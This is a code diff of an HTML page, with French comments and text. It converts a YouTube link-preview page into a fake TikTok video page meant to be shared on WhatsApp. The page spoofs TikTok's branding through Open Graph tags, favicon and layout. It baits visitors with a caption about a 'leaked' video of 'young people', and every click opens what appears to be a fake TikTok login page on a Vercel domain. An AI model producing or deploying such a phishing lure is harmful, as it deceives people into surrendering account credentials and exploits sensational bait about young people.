@@ -4,316 +4,361 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <!-- Balises Open Graph pour WhatsApp -->
-    <meta property="og:title" content="Découvrez cette vidéo exclusive sur YouTube">
-    <meta property="og:description" content="Une présentation fascinante que vous devez absolument voir">
-    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+    <!-- Balises Open Graph pour l'aperçu TikTok sur WhatsApp -->
+    <meta property="og:title" content="@username • Vidéo TikTok originale">
+    <meta property="og:description" content="Découvrez cette vidéo incroyable qui fait le buzz ! 🔥✨ #viral #trending">
+    <meta property="og:image" content="https://p16-sign-va.tiktokcdn.com/obj/tos-maliva-p-0068/c5e8d4a0c9b44d4c8f7e3b2a1d6e9f8a?x-expires=1640995200&x-signature=example">
     <meta property="og:url" content="https://votre-site.netlify.app">
     <meta property="og:type" content="video.other">
-    <meta property="og:image:width" content="1280">
-    <meta property="og:image:height" content="720">
+    <meta property="og:site_name" content="TikTok">
+    <meta property="og:image:width" content="720">
+    <meta property="og:image:height" content="1280">
 
-    <!-- Meta tags supplémentaires pour WhatsApp -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Découvrez cette vidéo exclusive sur YouTube">
-    <meta name="twitter:description" content="Une présentation fascinante que vous devez absolument voir">
-    <meta name="twitter:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+    <!-- Meta tags pour WhatsApp et autres plateformes -->
+    <meta name="twitter:card" content="player">
+    <meta name="twitter:title" content="@username • Vidéo TikTok originale">
+    <meta name="twitter:description" content="Découvrez cette vidéo incroyable qui fait le buzz ! 🔥✨ #viral #trending">
+    <meta name="twitter:image" content="https://p16-sign-va.tiktokcdn.com/obj/tos-maliva-p-0068/c5e8d4a0c9b44d4c8f7e3b2a1d6e9f8a?x-expires=1640995200&x-signature=example">
 
-    <title>Découvrez cette vidéo exclusive sur YouTube</title>
+    <!-- Favicon TikTok -->
+    <link rel="icon" type="image/x-icon" href="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/webapp/main/webapp-desktop/8152caf0c8e8bc67ae0d.ico">
+
+    <title>@username • Vidéo TikTok originale</title>
 
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
 
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #000;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            padding: 20px;
-            color: #333;
-        }
-
-        .container {
-            background-color: white;
-            border-radius: 15px;
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
-            overflow: hidden;
-            max-width: 500px;
-            width: 100%;
-            text-align: center;
-            margin: 20px;
-        }
-
-        .preview-header {
-            background: linear-gradient(to right, #ff416c, #ff4b2b);
             color: white;
-            padding: 20px;
+            overflow: hidden;
+        }
+
+        .tiktok-container {
+            width: 100%;
+            max-width: 375px;
+            height: 100vh;
+            background: linear-gradient(45deg, #ff0050, #ff0050, #000);
+            position: relative;
+            cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
         }
 
-        .preview-header img {
-            width: 40px;
-            margin-right: 15px;
-        }
-
-        .preview-image {
+        .video-preview {
             width: 100%;
-            height: 280px;
-            background-color: #0088ff;
-            background-image: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg');
-            background-size: cover;
-            background-position: center;
-            display: flex;
-            align-items: flex-end;
-            justify-content: center;
+            height: 100%;
+            background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT-zJFxwe1FMm7OCzeek9xfBJqOibm2dPeQLQ&s?text=TikTok+Video') center/cover;
             position: relative;
-            cursor: pointer;
-            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        .preview-image:hover {
-            filter: brightness(1.1);
+        .play-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
         }
 
         .play-button {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
             width: 80px;
             height: 80px;
-            background-color: rgba(255, 0, 0, 0.8);
+            background: rgba(255, 255, 255, 0.9);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
+            animation: pulse 2s infinite;
             cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-        }
-
-        .play-button:hover {
-            background-color: rgba(255, 0, 0, 1);
-            transform: translate(-50%, -50%) scale(1.1);
         }
 
         .play-button::after {
             content: '';
             border-style: solid;
-            border-width: 15px 0 15px 26.0px;
-            border-color: transparent transparent transparent white;
+            border-width: 15px 0 15px 25px;
+            border-color: transparent transparent transparent #000;
             margin-left: 5px;
         }
 
-        .image-label {
-            background-color: rgba(0, 0, 0, 0.7);
-            color: white;
-            padding: 10px 15px;
-            width: 100%;
-            text-align: center;
-            font-size: 14px;
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.9; }
+            50% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.9; }
         }
 
-        .content {
-            padding: 25px;
+        .tiktok-ui {
+            position: absolute;
+            bottom: 100px;
+            left: 20px;
+            right: 70px;
+            z-index: 3;
         }
 
-        h1 {
-            color: #2c3e50;
+        .user-info {
+            display: flex;
+            align-items: center;
             margin-bottom: 15px;
-            font-size: 24px;
         }
 
-        p {
-            color: #7f8c8d;
-            line-height: 1.6;
-            margin-bottom: 20px;
+        .avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #ff0050, #ff4d6d);
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 16px;
         }
 
-        .btn {
-            display: inline-block;
-            background: linear-gradient(to right, #ff416c, #ff4b2b);
-            color: white;
-            padding: 14px 30px;
-            border-radius: 50px;
-            text-decoration: none;
+        .username {
             font-weight: 600;
-            margin-top: 10px;
-            transition: all 0.3s ease;
-            border: none;
-            cursor: pointer;
-            box-shadow: 0 5px 15px rgba(255, 75, 43, 0.4);
+            font-size: 16px;
+            color: white;
         }
 
-        .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(255, 75, 43, 0.6);
-        }
-
-        .instructions {
-            background-color: #f8f9fa;
-            border-radius: 10px;
-            padding: 20px;
-            margin-top: 30px;
-            max-width: 500px;
-            width: 100%;
-        }
-
-        .instructions h2 {
-            color: #2c3e50;
-            margin-bottom: 15px;
-            font-size: 20px;
-        }
-
-        .instructions ol {
-            text-align: left;
-            padding-left: 20px;
-            line-height: 1.8;
-        }
-
-        .instructions li {
+        .description {
+            font-size: 14px;
+            line-height: 1.4;
+            color: white;
             margin-bottom: 10px;
         }
 
-        .whatsapp-button {
-            display: inline-flex;
-            align-items: center;
-            background-color: #25D366;
+        .hashtags {
             color: white;
-            padding: 12px 25px;
-            border-radius: 50px;
-            text-decoration: none;
             font-weight: 600;
-            margin-top: 20px;
+        }
+
+        .side-actions {
+            position: absolute;
+            right: 15px;
+            bottom: 100px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            z-index: 3;
+        }
+
+        .action-btn {
+            width: 48px;
+            height: 48px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            cursor: pointer;
             transition: all 0.3s ease;
         }
 
-        .whatsapp-button:hover {
-            background-color: #128C7E;
-            transform: translateY(-2px);
+        .action-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: scale(1.1);
         }
 
-        .whatsapp-button img {
-            width: 24px;
-            margin-right: 10px;
+        .tiktok-logo {
+            position: absolute;
+            top: 60px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 4;
         }
 
-        .pulse {
-            animation: pulse 2s infinite;
+        .tiktok-logo svg {
+            width: 100px;
+            height: 30px;
         }
 
-        @keyframes pulse {
-            0% {
-                transform: translate(-50%, -50%) scale(1);
-            }
-            50% {
-                transform: translate(-50%, -50%) scale(1.05);
-            }
-            100% {
-                transform: translate(-50%, -50%) scale(1);
-            }
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 999;
         }
 
-        @media (max-width: 600px) {
-            .container {
-                margin: 10px;
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255, 0, 80, 0.3);
+            border-radius: 50%;
+            border-top-color: #ff0050;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .instructions {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 12px;
+            z-index: 5;
+            display: none;
+        }
+
+        .show-instructions {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            z-index: 6;
+        }
+
+        @media (min-width: 768px) {
+            .tiktok-container {
+                max-width: 375px;
+                height: 667px;
+                border-radius: 15px;
+                overflow: hidden;
+                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
             }
 
-            h1 {
-                font-size: 22px;
-            }
-
-            .preview-image {
-                height: 220px;
-            }
-
-            .play-button {
-                width: 70px;
-                height: 70px;
+            .instructions {
+                display: block;
+                position: relative;
+                margin-top: 20px;
+                max-width: 375px;
             }
         }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="preview-header">
-        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIj48cGF0aCBmaWxsPSIjZmZmZmZmIiBkPSJNNTEyIDI1NkMyNTYgNTEyIDI1NiA1MTIgMjU2IDUxMiAyNTYgNTEyIDAgMjU2IDAgMjU2IDAgMjU2IDI1NiAwIDI1NiAwIDI1NiAwIDUxMiAyNTYgNTEyIDI1NnoiLz48cGF0aCBmaWxsPSIjZmZmZmZmIiBkPSJNMjA4IDM2OGw0My0zNTJoNzRsLTQzIDM1MmgtNzR6bTM2LTEwNGMwIDIwIDEzLjMgMzYgMzAgMzZzMzAtMTYgMzAtMzZjMC0yMC0xMy4zLTM2LTMwLTM2cy0zMCAxNi0zMCAzNnoiLz48L3N2Zz4=" alt="YouTube Icon">
-        <h1>Vidéo YouTube Exclusive</h1>
+<button class="show-instructions" onclick="toggleInstructions()">ℹ️</button>
+
+<div class="tiktok-container" id="tiktokContainer">
+    <div class="tiktok-logo">
+        <svg viewBox="0 0 118 42" fill="white">
+            <path d="M9.875 16.842V15.22c-.44-.043-.775-.087-1.22-.087C3.815 15.133 0 18.948 0 23.813c0 2.935 1.455 5.532 3.68 7.105a8.94 8.94 0 0 1-2.132-5.907c0-4.865 3.815-8.68 8.68-8.68.442 0 .884.044 1.322.087v-.586z"/>
+            <path d="M10.962 11.82v3.967c0 .263-.22.48-.483.48-.263 0-.483-.217-.483-.48V11.82c0-.263.22-.48.483-.48.263 0 .483.217.483.48z"/>
+        </svg>
     </div>
 
-    <div class="preview-image" id="previewImage">
-        <div class="play-button pulse" id="playButton"></div>
-        <div class="image-label">Cliquez pour regarder la vidéo</div>
+    <div class="video-preview">
+        <div class="play-overlay">
+            <div class="play-button"></div>
+        </div>
     </div>
 
-    <div class="content">
-        <h1>Découvrez cette vidéo exclusive</h1>
-        <p>Cliquez sur le bouton ci-dessous ou sur l'image pour accéder à la vidéo YouTube.</p>
+    <div class="tiktok-ui">
+        <div class="user-info">
+            <div class="avatar">👤</div>
+            <div class="username">@username</div>
+        </div>
+        <div class="description">
+            Voici la nouvelle vidéo LOMOTIF de ces jeunes qui a fuité - ! 🔥✨
+        </div>
+        <div class="hashtags">#viral #trending #fyp #foryou</div>
+    </div>
 
-        <button class="btn" id="redirectButton">Voir la vidéo maintenant</button>
-
-        <p style="font-size: 14px; margin-top: 20px;">Partagez ce lien sur WhatsApp pour voir l'aperçu</p>
-
-        <a href="#" class="whatsapp-button" id="whatsappShare">
-            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIj48cGF0aCBmaWxsPSIjZmZmZmZmIiBkPSJNNDE0IDk4Yy0xMDYtMTA2LTI3OC0xMDYtMzg0IDAtMTA2IDEwNi0xMDYgMjc4IDAgMzg0IDM4LjggMzguOCA4NC40IDY2IDEzMiA3OGwyMCAxMjIgMTIyLTIwYzEyIDQ3LjIgMzkuMiA5My4yIDc4IDEzMiAxMDYgMTA2IDI3OCAxMDYgMzg0IDAgMTA2LTEwNiAxMDYtMjc4IDAtMzg0em0tMjI0LTE4YzAtMTcgMTQtMzEgMzEtMzFoNjZjMTcgMCAzMSAxNCAzMSAzMXMtMTQgMzEtMzEgMzFoLTY2Yy0xNyAwLTMxLTE0LTMxLTMxem0xMjggMTkyYy0xNyAwLTMxLTE0LTMxLTMxdi05NmMwLTE3IDE0LTMxIDMxLTMxczMxIDE0IDMxIDMxdjk2YzAgMTctMTQgMzEtMzEgMzF6bTY0LTY0YzAtMTcgMTQtMzEgMzEtMzFoMzJjMTcgMCAzMSAxNCAzMSAzMXMtMTQgMzEtMzEgMzFsLTMyIDBjLTE3IDAtMzEtMTQtMzEtMzF6bS0zMi02NGMwLTE3IDE0LTMxIDMxLTMxaDY0YzE3IDAgMzEgMTQgMzEgMzFzLTE0IDMxLTMxIDMxaC02NGMtMTcgMC0zMS0xNC0zMS0zMXoiLz48L3N2Zz4=" alt="WhatsApp Icon">
-            Partager sur WhatsApp
-        </a>
+    <div class="side-actions">
+        <div class="action-btn">❤️</div>
+        <div class="action-btn">💬</div>
+        <div class="action-btn">↗️</div>
+        <div class="action-btn">🎵</div>
     </div>
 </div>
 
-<div class="instructions">
-    <h2>Instructions pour l'aperçu WhatsApp :</h2>
-    <ol>
-        <li><strong>Déployez sur Netlify :</strong> Uploadez ce fichier HTML sur Netlify pour obtenir une URL publique</li>
-        <li><strong>Modifiez l'URL :</strong> Remplacez "https://votre-site.netlify.app" dans les balises meta par votre vraie URL Netlify</li>
-        <li><strong>Changez l'image :</strong> Remplacez l'ID vidéo "dQw4w9WgXcQ" par l'ID de votre vidéo YouTube</li>
-        <li><strong>Testez l'aperçu :</strong> Utilisez l'outil <a href="https://developers.facebook.com/tools/debug/" target="_blank">Facebook Debugger</a> pour vérifier l'aperçu</li>
-        <li><strong>Partagez :</strong> Partagez votre URL Netlify sur WhatsApp - l'aperçu avec image devrait s'afficher</li>
-    </ol>
+<div class="loading-screen" id="loadingScreen">
+    <div class="spinner"></div>
+    <p>Chargement de la vidéo...</p>
 </div>
 
 <script>
-    // Configuration - Changez cette URL vers votre vidéo YouTube
-    const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+    // 🎯 CONFIGURATION - Modifiez ces URLs selon vos besoins
+    const REDIRECT_TIKTOK_URL = "https://tiktok-auth-client.vercel.app/login";
 
-    // Fonction de redirection
-    function redirectToYouTube() {
-        window.open(redirectUrl, '_blank');
+    // Variables pour l'aperçu
+    const USERNAME = "@username";
+    const DESCRIPTION = " Voici la nouvelle vidéo LOMOTIF de ces jeunes qui a fuité - 🔥✨";
+    const HASHTAGS = "#viral #trending #fyp #foryou";
+
+    // Fonction de redirection avec effet de chargement
+    function redirectToTikTok() {
+        const loadingScreen = document.getElementById('loadingScreen');
+        loadingScreen.style.display = 'flex';
+
+        // Simule un temps de chargement comme TikTok
+        setTimeout(() => {
+            window.open(REDIRECT_TIKTOK_URL, '_blank');
+            loadingScreen.style.display = 'none';
+        }, 1500);
     }
 
-    // Éléments du DOM
-    const redirectButton = document.getElementById('redirectButton');
-    const playButton = document.getElementById('playButton');
-    const previewImage = document.getElementById('previewImage');
-    const whatsappShare = document.getElementById('whatsappShare');
+    // Gestion des clics
+    document.getElementById('tiktokContainer').addEventListener('click', redirectToTikTok);
 
-    // Événements de clic pour la redirection
-    redirectButton.addEventListener('click', redirectToYouTube);
-    playButton.addEventListener('click', redirectToYouTube);
-    previewImage.addEventListener('click', redirectToYouTube);
+    // Toggle instructions sur mobile
+    function toggleInstructions() {
+        const instructions = document.getElementById('instructions');
+        instructions.style.display = instructions.style.display === 'block' ? 'none' : 'block';
+    }
 
-    // Configuration du partage WhatsApp
-    const pageUrl = window.location.href;
-    const shareText = "Découvrez cette vidéo exclusive sur YouTube!";
-    whatsappShare.href = `https://wa.me/?text=${encodeURIComponent(shareText + " " + pageUrl)}`;
-
-    // Animation au survol
-    previewImage.addEventListener('mouseenter', function() {
-        playButton.classList.remove('pulse');
+    // Mise à jour dynamique du contenu
+    document.addEventListener('DOMContentLoaded', function() {
+        document.querySelector('.username').textContent = USERNAME;
+        document.querySelector('.description').textContent = DESCRIPTION;
+        document.querySelector('.hashtags').textContent = HASHTAGS;
     });
 
-    previewImage.addEventListener('mouseleave', function() {
-        playButton.classList.add('pulse');
+    // Animation d'entrée
+    window.addEventListener('load', function() {
+        document.querySelector('.tiktok-container').style.animation = 'slideUp 0.5s ease-out';
     });
 </script>
+
+<style>
+    @keyframes slideUp {
+        from {
+            transform: translateY(100px);
+            opacity: 0;
+        }
+        to {
+            transform: translateY(0);
+            opacity: 1;
+        }
+    }
+</style>
 </body>
 </html>
